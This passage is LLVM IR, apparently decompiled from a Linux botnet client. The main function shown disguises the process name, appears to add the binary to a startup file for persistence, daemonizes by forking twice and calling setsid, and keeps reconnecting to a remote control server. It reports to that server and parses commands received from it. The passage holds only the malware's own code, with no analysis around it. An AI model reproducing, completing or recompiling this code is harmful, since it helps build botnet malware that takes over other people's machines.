  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_804f5ee, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f5b1, { 1, 0 }
  uselistorder label %dec_label_pc_804f55d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f509, { 1, 0 }
  uselistorder label %dec_label_pc_804f4e1, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([11 x i8]* @global_var_805fdf3.677 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804f600 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804f600, i32* %stack_var_-24, align 4
  %v5_804f611 = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_804f611, i1* %cf.global-to-local, align 1
  %v1_804f62a = add i32 %v2_804f600, 4
  %v2_804f62a = inttoptr i32 %v1_804f62a to i32*
  %v3_804f62a = load i32, i32* %v2_804f62a, align 4
  %v1_804f62d = inttoptr i32 %v3_804f62a to i32*
  %v2_804f62d = load i32, i32* %v1_804f62d, align 4
  store i1 false, i1* @df, align 1
  %v4_804f63d = inttoptr i32 %v2_804f62d to i8*
  store i32 %v2_804f62d, i32* @edi, align 4
  %v3_804f643 = call i32 @_strlen(i8* %v4_804f63d)
  %v3_804f652 = load i32, i32* %v2_804f62a, align 4
  %v1_804f655 = inttoptr i32 %v3_804f652 to i32*
  %v2_804f655 = load i32, i32* %v1_804f655, align 4
  store i32 %v2_804f655, i32* %stack_var_-5888, align 4
  %v4_804f666 = inttoptr i32 %v2_804f655 to i8*
  %v5_804f666 = call i32 @strncpy(i8* %v4_804f666, i32 ptrtoint (i32* @global_var_805fdfe.678 to i32), i32 %v3_804f643)
  store i32 %v2_804f600, i32* @esi, align 4
  %v3_804f676 = load i32, i32* %v2_804f62a, align 4
  %v2_804f679 = inttoptr i32 %v3_804f676 to i32*
  store i32 ptrtoint (i32* @global_var_805fdfe.678 to i32), i32* %v2_804f679, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_804f6a1 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_805fdfe.678 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804f6ad = call i32 @__GI_time(i32* null)
  store i32 %v2_804f6ad, i32* @ebx, align 4
  %v0_804f6b4 = call i32 @__libc_getpid()
  %v1_804f6b9 = load i32, i32* @ebx, align 4
  %v2_804f6b9 = xor i32 %v1_804f6b9, %v0_804f6b4
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804f6b9, i32* @eax, align 4
  store i32 %v2_804f6b9, i32* %stack_var_-5888, align 4
  %v1_804f6be = call i32 @srand(i32 %v2_804f6b9)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804f6ca = call i32 @__GI_time(i32* null)
  store i32 %v2_804f6ca, i32* @ebx, align 4
  %v0_804f6d1 = call i32 @__libc_getpid()
  %v1_804f6d6 = load i32, i32* @ebx, align 4
  %v2_804f6d6 = xor i32 %v1_804f6d6, %v0_804f6d1
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804f6d6, i32* %stack_var_-5888, align 4
  %v1_804f6db = call i32 @init_rand(i32 %v2_804f6d6)
  store i32 ptrtoint ([19 x i8]* @global_var_805fdff.679 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_805fdff.679 to i32), i32* %stack_var_-5888, align 4
  %v3_804f6fc = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_805fdff.679 to i32), i32 ptrtoint ([2 x i8]* @global_var_805fe12.680 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f704 = icmp eq i32 %v3_804f6fc, 0
  %v1_804f708 = icmp eq i1 %v4_804f704, false
  br i1 %v1_804f708, label %dec_label_pc_804f727, label %dec_label_pc_804f70a

dec_label_pc_804f70a:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_805fe14.681 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_805fe14.681 to i32), i32* %stack_var_-5888, align 4
  %v3_804f71f = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_805fe14.681 to i32), i32 ptrtoint ([2 x i8]* @global_var_805fe12.680 to i32))
  br label %dec_label_pc_804f727

dec_label_pc_804f727:                             ; preds = %entry, %dec_label_pc_804f70a
  %stack_var_-88.0 = phi i32 [ %v3_804f6fc, %entry ], [ %v3_804f71f, %dec_label_pc_804f70a ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805fdff.679, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805fe14.681, i32 0, i32 0), %dec_label_pc_804f70a ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f727 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804f727, label %dec_label_pc_804f8c9, label %dec_label_pc_804f731

dec_label_pc_804f731:                             ; preds = %dec_label_pc_804f727
  %v3_804f737 = load i32, i32* %v2_804f62a, align 4
  %v1_804f73a = inttoptr i32 %v3_804f737 to i32*
  %v2_804f73a = load i32, i32* %v1_804f73a, align 4
  store i1 false, i1* @df, align 1
  %v4_804f74a = inttoptr i32 %v2_804f73a to i8*
  store i32 %v2_804f73a, i32* @edi, align 4
  %v3_804f750 = call i32 @_strlen(i8* %v4_804f74a)
  %v2_804f769 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804f769, i32* %stack_var_-5888, align 4
  %v3_804f772 = call i32 @getcwd(i32 %v2_804f769, i32 256)
  store i1 false, i1* @df, align 1
  %v4_804f798 = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_804f769, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_805fe21.682 to i32), i32* @edi, align 4
  %v7_804f7aa = call i32 @_strncmp(i8* %v4_804f798, i8* bitcast (i8** @global_var_805fe21.682 to i8*), i32 2)
  %v8_804f7aa = urem i32 %v7_804f7aa, 2
  %v9_804f7aa = icmp eq i32 %v8_804f7aa, 0
  %v0_804f7ac = load i1, i1* @cf, align 1
  %v2_804f7ac = or i1 %v0_804f7ac, %v9_804f7aa
  %v3_804f7ac = zext i1 %v2_804f7ac to i8
  %v7_804f7ac = xor i8 %v3_804f7ac, 1
  %v5_804f7af = ptrtoint i32* %stack_var_-512 to i32
  %v3_804f7b2 = and i32 %v7_804f7aa, -256
  %v3_804f7b4 = trunc i32 %v5_804f7af to i8
  %v4_804f7b4 = sub i8 %v7_804f7ac, %v3_804f7b4
  %v15_804f7b4 = icmp eq i8 %v4_804f7b4, 0
  %v20_804f7b4 = zext i8 %v4_804f7b4 to i32
  %v23_804f7b4 = or i32 %v20_804f7b4, %v3_804f7b2
  store i32 %v23_804f7b4, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804f7b4, label %dec_label_pc_804f8be, label %dec_label_pc_804f7c8

dec_label_pc_804f7c5:                             ; preds = %dec_label_pc_804f7c8
  %v4_804f7c5 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804f7c8

dec_label_pc_804f7c8:                             ; preds = %dec_label_pc_804f731, %dec_label_pc_804f7c5
  %stack_var_-84.0 = phi i32 [ %v4_804f7c5, %dec_label_pc_804f7c5 ], [ %v3_804f750, %dec_label_pc_804f731 ]
  store i32 %v2_804f600, i32* @esi, align 4
  %v3_804f7ce = load i32, i32* %v2_804f62a, align 4
  %v1_804f7d1 = inttoptr i32 %v3_804f7ce to i32*
  %v2_804f7d1 = load i32, i32* %v1_804f7d1, align 4
  %v2_804f7d6 = add i32 %v2_804f7d1, %stack_var_-84.0
  %v1_804f7d9 = inttoptr i32 %v2_804f7d6 to i8*
  %v2_804f7d9 = load i8, i8* %v1_804f7d9, align 1
  %v6_804f7dc = icmp ult i8 %v2_804f7d9, 47
  store i1 %v6_804f7dc, i1* %cf.global-to-local, align 1
  %v10_804f7dc = icmp eq i8 %v2_804f7d9, 47
  %v1_804f7de = icmp eq i1 %v10_804f7dc, false
  br i1 %v1_804f7de, label %dec_label_pc_804f7c5, label %dec_label_pc_804f7e0

dec_label_pc_804f7e0:                             ; preds = %dec_label_pc_804f7c8
  store i32 %v2_804f600, i32* @edi, align 4
  %v3_804f7e6 = load i32, i32* %v2_804f62a, align 4
  %v1_804f7e9 = inttoptr i32 %v3_804f7e6 to i32*
  %v2_804f7e9 = load i32, i32* %v1_804f7e9, align 4
  %v2_804f7ee = add i32 %v2_804f7e9, %stack_var_-84.0
  %v2_804f807 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804f807, i32* %stack_var_-5888, align 4
  %v5_804f810 = call i32 @sprintf(i32 %v2_804f807, i32 ptrtoint ([8 x i8]* @global_var_805fe23.683 to i32), i32 %v2_804f769, i32 %v2_804f7ee)
  %v1_804f859 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804f826 = ptrtoint i32* %stack_var_-1648 to i32
  %v3_804f847 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_804f853.outer

dec_label_pc_804f817:                             ; preds = %dec_label_pc_804f853
  store i32 %v2_804f826, i32* %stack_var_-5888, align 4
  %v4_804f82f = call i32 @fgets(i32 %v2_804f826, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_804f826, i32* %stack_var_-5888, align 4
  %v4_804f847 = call i32 @__GI_strcasecmp(i8* %v3_804f847, i32 %v2_804f807)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f84c = icmp eq i32 %v4_804f847, 0
  %v1_804f84e = icmp eq i1 %v1_804f84c, false
  br i1 %v1_804f84e, label %dec_label_pc_804f853, label %dec_label_pc_804f850

dec_label_pc_804f850:                             ; preds = %dec_label_pc_804f817
  %v4_804f850 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804f853.outer

dec_label_pc_804f853.outer:                       ; preds = %dec_label_pc_804f850, %dec_label_pc_804f7e0
  %stack_var_-80.0.ph = phi i32 [ %v4_804f850, %dec_label_pc_804f850 ], [ 0, %dec_label_pc_804f7e0 ]
  br label %dec_label_pc_804f853

dec_label_pc_804f853:                             ; preds = %dec_label_pc_804f853.outer, %dec_label_pc_804f817
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804f859 = call i32 @feof(i16* %v1_804f859)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f85e = icmp eq i32 %v2_804f859, 0
  br i1 %v1_804f85e, label %dec_label_pc_804f817, label %dec_label_pc_804f862

dec_label_pc_804f862:                             ; preds = %dec_label_pc_804f853
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f862 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804f866 = icmp eq i1 %v4_804f862, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804f8b7 = call i32 @__GI_fclose(i16* %v1_804f859)
  br i1 %v1_804f866, label %dec_label_pc_804f8c9, label %dec_label_pc_804f868

dec_label_pc_804f868:                             ; preds = %dec_label_pc_804f862
  %v4_804f87b = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_804f87b, i32* @eax, align 4
  store i32 %v4_804f87b, i32* %stack_var_-5888, align 4
  %v3_804f881 = call i32 @__GI_fopen(i32 %v4_804f87b, i32 ptrtoint (i32* @global_var_805fe2b.684 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f889 = icmp eq i32 %v3_804f881, 0
  br i1 %v4_804f889, label %dec_label_pc_804f8c9, label %dec_label_pc_804f88f

dec_label_pc_804f88f:                             ; preds = %dec_label_pc_804f868
  store i32 %v2_804f807, i32* %stack_var_-5888, align 4
  %v3_804f89f = call i32 @__GI_fputs(i32 %v2_804f807, i32 %v3_804f881)
  store i32 %v3_804f881, i32* @eax, align 4
  store i32 %v3_804f881, i32* %stack_var_-5888, align 4
  %v1_804f8aa = inttoptr i32 %v3_804f881 to i16*
  %v2_804f8aa = call i32 @__GI_fclose(i16* %v1_804f8aa)
  br label %dec_label_pc_804f8c9

dec_label_pc_804f8be:                             ; preds = %dec_label_pc_804f731
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_804f8c4 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804f8c4 = call i32 @__GI_fclose(i16* %v1_804f8c4)
  br label %dec_label_pc_804f8c9

dec_label_pc_804f8c9:                             ; preds = %dec_label_pc_804f862, %dec_label_pc_804f868, %dec_label_pc_804f727, %dec_label_pc_804f88f, %dec_label_pc_804f8be
  %v0_804f8c9 = call i32 @getOurIP()
  %v0_804f8ce = load i32, i32* %stack_var_-5888, align 4
  %v1_804f8ce = call i32 @__libc_fork(i32 %v0_804f8ce)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f8d6 = icmp eq i32 %v1_804f8ce, 0
  br i1 %v4_804f8d6, label %dec_label_pc_804f908, label %dec_label_pc_804f937

dec_label_pc_804f908:                             ; preds = %dec_label_pc_804f8c9
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804f908 = load i32, i32* %stack_var_-5888, align 4
  %v1_804f908 = call i32 @__libc_fork(i32 %v0_804f908)
  store i32 %v1_804f908, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f910 = icmp eq i32 %v1_804f908, 0
  br i1 %v4_804f910, label %dec_label_pc_804f922.thread, label %dec_label_pc_804f928

dec_label_pc_804f922.thread:                      ; preds = %dec_label_pc_804f908
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f944

dec_label_pc_804f928:                             ; preds = %dec_label_pc_804f908
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804f91d = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_805fe2d.685 to i32), i32* %stack_var_-5888, align 4
  %v1_804f930 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805fe2d.685 to i32))
  br label %dec_label_pc_804f944

dec_label_pc_804f937:                             ; preds = %dec_label_pc_804f8c9
  %v2_804f8e4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_804f8ce, i32* %stack_var_-5888, align 4
  %v4_804f8f1 = call i32 @__libc_waitpid(i32 %v1_804f8ce, i32 %v2_804f8e4, i32 0)
  store i32 %v4_804f8f1, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804f8fd = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_805fe2d.685 to i32), i32* %stack_var_-5888, align 4
  %v1_804f93f = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805fe2d.685 to i32))
  br label %dec_label_pc_804f944

dec_label_pc_804f944:                             ; preds = %dec_label_pc_804f922.thread, %dec_label_pc_804f928, %dec_label_pc_804f937
  %v0_804f944 = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_805fe21.682 to i32), i32* %stack_var_-5888, align 4
  %v1_804f950 = call i32 @chdir(i32 ptrtoint (i8** @global_var_805fe21.682 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_804f964 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8050021 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_804fe10 = ptrtoint i32* %stack_var_-1648 to i32
  %v4_804fe2c = bitcast i32* %stack_var_-1648 to i8*
  %v1_804fc8d = or i32 %v2_8050021, 1
  %storemerge13127 = inttoptr i32 %v1_804fc8d to i8*
  br label %dec_label_pc_804f96b.outer

dec_label_pc_804f96b.outer:                       ; preds = %dec_label_pc_804fc4d, %dec_label_pc_8050021, %dec_label_pc_804f944
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_804f944 ], [ %stack_var_-96.2.ph, %dec_label_pc_8050021 ], [ %v4_804fc4d, %dec_label_pc_804fc4d ]
  %v0_804f96b24 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f97025 = icmp eq i32 %v0_804f96b24, 0
  br i1 %v1_804f97025, label %dec_label_pc_804f982, label %dec_label_pc_804f974

dec_label_pc_804f974:                             ; preds = %dec_label_pc_804f96b.outer, %dec_label_pc_804f974
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_804f97b = call i32 @sleep(i32 30)
  %v0_804f96b = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f970 = icmp eq i32 %v0_804f96b, 0
  br i1 %v1_804f970, label %dec_label_pc_804f982, label %dec_label_pc_804f974

dec_label_pc_804f982:                             ; preds = %dec_label_pc_804f974, %dec_label_pc_804f96b.outer
  %v0_804f982 = load i32, i32* @global_var_8068808.157, align 8
  store i32 %v0_804f982, i32* %stack_var_-5888, align 4
  %v1_804f98a = call i32 @__GI_inet_ntoa(i32 %v0_804f982)
  store i32 %v1_804f98a, i32* @ebx, align 4
  %v0_804f991 = call i32 @getBuild()
  %v0_804f996 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804f996, i32* %stack_var_-5888, align 4
  %v3_804f9af = call i32 @sockprintf(i32 %v0_804f996, i32 ptrtoint ([12 x i8]* @global_var_805fe3a.686 to i32))
  br label %dec_label_pc_8050021.outer

dec_label_pc_804f9d3:                             ; preds = %dec_label_pc_804fbc4, %dec_label_pc_804fb7c
  %v2_804f9d6 = mul i32 %storemerge14, 4
  %v9_804f9d6 = and i32 %storemerge14, 1073741824
  %v10_804f9d6 = icmp ne i32 %v9_804f9d6, 0
  store i1 %v10_804f9d6, i1* %cf.global-to-local, align 1
  %v0_804f9db = load i32, i32* @global_var_8068814.36, align 4
  %v2_804f9e0 = add i32 %v0_804f9db, %v2_804f9d6
  %v1_804f9e3 = inttoptr i32 %v2_804f9e0 to i32*
  %v2_804f9e3 = load i32, i32* %v1_804f9e3, align 4
  store i32 %v2_804f9e3, i32* %stack_var_-5888, align 4
  %v4_804f9f8 = call i32 @__libc_waitpid(i32 %v2_804f9e3, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_804f9f8, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_804fb79, label %dec_label_pc_804fa05

dec_label_pc_804fa05:                             ; preds = %dec_label_pc_804f9d3
  br label %dec_label_pc_804fa38

dec_label_pc_804fa0e:                             ; preds = %dec_label_pc_804fa38, %dec_label_pc_804fa72
  %v2_804fa11 = mul i32 %storemerge16, 4
  %v0_804fa16 = load i32, i32* @global_var_8068814.36, align 4
  %v2_804fa1b = add i32 %v0_804fa16, %v2_804fa11
  %v1_804fa1e = add i32 %v2_804fa1b, -4
  %v1_804fa31 = inttoptr i32 %v2_804fa1b to i32*
  %v2_804fa31 = load i32, i32* %v1_804fa31, align 4
  %v2_804fa33 = inttoptr i32 %v1_804fa1e to i32*
  store i32 %v2_804fa31, i32* %v2_804fa33, align 4
  %v4_804fa35 = add i32 %storemerge16, 1
  br label %dec_label_pc_804fa38

dec_label_pc_804fa38:                             ; preds = %dec_label_pc_804fa05, %dec_label_pc_804fa0e
  %storemerge16 = phi i32 [ %v4_804fa35, %dec_label_pc_804fa0e ], [ %.pre, %dec_label_pc_804fa05 ]
  %v0_804fa4c = load i32, i32* @global_var_8062588.34, align 8
  %v0_804fa52 = load i32, i32* @global_var_806258c.35, align 4
  %v10_804fa6a = icmp eq i32 %v0_804fa52, 0
  br i1 %v10_804fa6a, label %dec_label_pc_804fa72, label %dec_label_pc_804fa0e

dec_label_pc_804fa72:                             ; preds = %dec_label_pc_804fa38
  store i32 0, i32* @esi, align 4
  store i32 %v0_804fa4c, i32* @edi, align 4
  %v10_804fa86 = icmp ult i32 %storemerge16, %v0_804fa4c
  br i1 %v10_804fa86, label %dec_label_pc_804fa0e, label %dec_label_pc_804fa8e

dec_label_pc_804fa8e:                             ; preds = %dec_label_pc_804fa72
  %v2_804fa91 = mul i32 %storemerge16, 4
  %v0_804fa96 = load i32, i32* @global_var_8068814.36, align 4
  %v2_804fa9b = add i32 %v2_804fa91, -4
  %v1_804fa9e = add i32 %v2_804fa9b, %v0_804fa96
  %v1_804faa1 = inttoptr i32 %v1_804fa9e to i32*
  store i32 0, i32* %v1_804faa1, align 4
  %v0_804faa7 = load i32, i32* @global_var_8062588.34, align 8
  %v0_804faac = load i32, i32* @global_var_806258c.35, align 4
  %v1_804fab2 = add i32 %v0_804faa7, -1
  %v4_804fab2 = icmp ne i32 %v0_804faa7, 0
  %v2_804fab5 = zext i1 %v4_804fab2 to i32
  %v3_804fab5 = add i32 %v0_804faac, -1
  %v4_804fab5 = add i32 %v3_804fab5, %v2_804fab5
  store i32 %v1_804fab2, i32* @global_var_8062588.34, align 8
  store i32 %v4_804fab5, i32* @global_var_806258c.35, align 4
  %v2_804fad2 = mul i32 %v1_804fab2, 4
  %v1_804fad5 = add i32 %v2_804fad2, 4
  %v5_804fad5 = icmp eq i32 %v2_804fad2, -4
  store i1 %v5_804fad5, i1* %cf.global-to-local, align 1
  store i32 %v1_804fad5, i32* %stack_var_-5888, align 4
  %v1_804fadb = call i32 @malloc(i32 %v1_804fad5)
  br label %dec_label_pc_804fb0e

dec_label_pc_804faec:                             ; preds = %dec_label_pc_804fb0e, %dec_label_pc_804fb48
  %v2_804faef = mul i32 %storemerge15, 4
  %v5_804faf4 = add i32 %v2_804faef, %v1_804fadb
  %v0_804faff = load i32, i32* @global_var_8068814.36, align 4
  %v2_804fb04 = add i32 %v0_804faff, %v2_804faef
  %v1_804fb07 = inttoptr i32 %v2_804fb04 to i32*
  %v2_804fb07 = load i32, i32* %v1_804fb07, align 4
  %v2_804fb09 = inttoptr i32 %v5_804faf4 to i32*
  store i32 %v2_804fb07, i32* %v2_804fb09, align 4
  %v4_804fb0b = add i32 %storemerge15, 1
  br label %dec_label_pc_804fb0e

dec_label_pc_804fb0e:                             ; preds = %dec_label_pc_804fa8e, %dec_label_pc_804faec
  %storemerge15 = phi i32 [ %v4_804fb0b, %dec_label_pc_804faec ], [ 0, %dec_label_pc_804fa8e ]
  %v0_804fb22 = load i32, i32* @global_var_8062588.34, align 8
  %v0_804fb28 = load i32, i32* @global_var_806258c.35, align 4
  %v10_804fb40 = icmp eq i32 %v0_804fb28, 0
  br i1 %v10_804fb40, label %dec_label_pc_804fb48, label %dec_label_pc_804faec

dec_label_pc_804fb48:                             ; preds = %dec_label_pc_804fb0e
  store i32 0, i32* @esi, align 4
  store i32 %v0_804fb22, i32* @edi, align 4
  %v10_804fb5c = icmp ult i32 %storemerge15, %v0_804fb22
  br i1 %v10_804fb5c, label %dec_label_pc_804faec, label %dec_label_pc_804fb64

dec_label_pc_804fb64:                             ; preds = %dec_label_pc_804fb48
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804fb64 = load i32, i32* @global_var_8068814.36, align 4
  store i32 %v0_804fb64, i32* %stack_var_-5888, align 4
  %v1_804fb6c = call i32 @free(i32 %v0_804fb64)
  store i32 %v1_804fadb, i32* @global_var_8068814.36, align 4
  br label %dec_label_pc_804fb79

dec_label_pc_804fb79:                             ; preds = %dec_label_pc_804f9d3, %dec_label_pc_804fb64
  br label %dec_label_pc_804fb7c

dec_label_pc_804fb7c:                             ; preds = %dec_label_pc_8050021, %dec_label_pc_804fb79
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_804fb79 ], [ 0, %dec_label_pc_8050021 ]
  %v1_804fb85 = ashr i32 %storemerge14, 31
  %v0_804fb8c = load i32, i32* @global_var_8062588.34, align 8
  store i32 %v0_804fb8c, i32* @esi, align 4
  %v0_804fb92 = load i32, i32* @global_var_806258c.35, align 4
  store i32 %v0_804fb92, i32* @edi, align 4
  %v10_804fbaa = icmp ult i32 %v1_804fb85, %v0_804fb92
  store i1 %v10_804fbaa, i1* %cf.global-to-local, align 1
  br i1 %v10_804fbaa, label %dec_label_pc_804f9d3, label %dec_label_pc_804fbb6

dec_label_pc_804fbb6:                             ; preds = %dec_label_pc_804fb7c
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804fbc2 = icmp ugt i32 %v1_804fb85, %v0_804fb92
  br i1 %v6_804fbc2, label %dec_label_pc_804fbd6, label %dec_label_pc_804fbc4

dec_label_pc_804fbc4:                             ; preds = %dec_label_pc_804fbb6
  %v10_804fbca = icmp ult i32 %storemerge14, %v0_804fb8c
  store i1 %v10_804fbca, i1* %cf.global-to-local, align 1
  br i1 %v10_804fbca, label %dec_label_pc_804f9d3, label %dec_label_pc_804fbd6

dec_label_pc_804fbd6:                             ; preds = %dec_label_pc_804fbc4, %dec_label_pc_804fbb6
  %v0_804fbd9 = load i32, i32* @ebp, align 4
  %v2_804fbd9 = add i32 %v5_805003c, -5736
  %v3_804fbd9 = add i32 %v2_804fbd9, %v0_804fbd9
  %v4_804fbd9 = inttoptr i32 %v3_804fbd9 to i8*
  store i8 0, i8* %v4_804fbd9, align 1
  store i32 %v2_8050021, i32* %stack_var_-5888, align 4
  %v2_804fbea = call i32 @trim(i8* %tmp121)
  store i32 %v2_8050021, i32* %stack_var_-5888, align 4
  %v4_804fc00 = call i32 @strstr(i32 %v2_8050021, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057957.21, i32 0, i32 0))
  %v7_804fc0d = icmp ult i32 %v4_804fc00, %v2_8050021
  store i1 %v7_804fc0d, i1* %cf.global-to-local, align 1
  %v12_804fc0d = icmp eq i32 %v4_804fc00, %v2_8050021
  %v1_804fc0f = icmp eq i1 %v12_804fc0d, false
  br i1 %v1_804fc0f, label %dec_label_pc_804fc2b, label %dec_label_pc_804fc11

dec_label_pc_804fc11:                             ; preds = %dec_label_pc_804fbd6
  %v0_804fc11 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804fc11, i32* %stack_var_-5888, align 4
  %v3_804fc21 = call i32 @sockprintf(i32 %v0_804fc11, i32 ptrtoint ([5 x i8]* @global_var_805fe46.687 to i32))
  br label %dec_label_pc_8050021

dec_label_pc_804fc2b:                             ; preds = %dec_label_pc_804fbd6
  store i32 %v2_8050021, i32* %stack_var_-5888, align 4
  %v4_804fc3c = call i32 @strstr(i32 %v2_8050021, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805fe4b.688, i32 0, i32 0))
  store i32 %v4_804fc3c, i32* @edx, align 4
  %v7_804fc49 = icmp ult i32 %v4_804fc3c, %v2_8050021
  store i1 %v7_804fc49, i1* %cf.global-to-local, align 1
  %v12_804fc49 = icmp eq i32 %v4_804fc3c, %v2_8050021
  %v1_804fc4b = icmp eq i1 %v12_804fc49, false
  br i1 %v1_804fc4b, label %dec_label_pc_804fc73, label %dec_label_pc_804fc4d

dec_label_pc_804fc4d:                             ; preds = %dec_label_pc_804fc2b
  %v4_804fc4d = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_805fe4f.689 to i32), i32* %stack_var_-5888, align 4
  %v1_804fc58 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_805fe4f.689 to i32))
  store i32 %v1_804fc58, i32* @eax, align 4
  %v9_804fc5d = icmp ult i32 %v4_804fc4d, 20
  store i1 %v9_804fc5d, i1* %cf.global-to-local, align 1
  %v7_804fc61 = icmp sgt i32 %v4_804fc4d, 20
  br i1 %v7_804fc61, label %dec_label_pc_804fc67, label %dec_label_pc_804f96b.outer

dec_label_pc_804fc67:                             ; preds = %dec_label_pc_804fc4d
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804fc6e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fc73

dec_label_pc_804fc73:                             ; preds = %dec_label_pc_804fc2b, %dec_label_pc_804fc67
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804fc2b ], [ %v4_804fc4d, %dec_label_pc_804fc67 ]
  %v2_804fc7f = load i8, i8* %tmp121, align 4
  %v6_804fc82 = icmp ult i8 %v2_804fc7f, 33
  store i1 %v6_804fc82, i1* %cf.global-to-local, align 1
  %v10_804fc82 = icmp eq i8 %v2_804fc7f, 33
  %v1_804fc84 = icmp eq i1 %v10_804fc82, false
  br i1 %v1_804fc84, label %dec_label_pc_8050021.outer, label %dec_label_pc_804fc8a

dec_label_pc_804fc8a:                             ; preds = %dec_label_pc_804fc73
  %v2_804fc99128 = load i8, i8* %storemerge13127, align 1
  %v3_804fc9c131 = icmp ult i8 %v2_804fc99128, 32
  store i1 %v3_804fc9c131, i1* %cf.global-to-local, align 1
  %v7_804fc9c135 = icmp eq i8 %v2_804fc99128, 32
  br i1 %v7_804fc9c135, label %dec_label_pc_804fcaa, label %dec_label_pc_804fca0

